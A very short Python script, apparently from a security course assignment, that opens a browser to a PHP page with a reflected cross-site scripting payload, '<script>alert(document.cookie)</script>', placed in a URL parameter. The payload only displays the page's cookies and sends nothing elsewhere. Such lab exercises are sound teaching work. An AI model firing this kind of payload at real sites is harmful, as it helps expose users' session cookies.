import webbrowser

url = "http://www.wsb.com/Assignment2/case07.php?timer=<script>alert(document.cookie)</script>"
new = 2
webbrowser.open(url, new)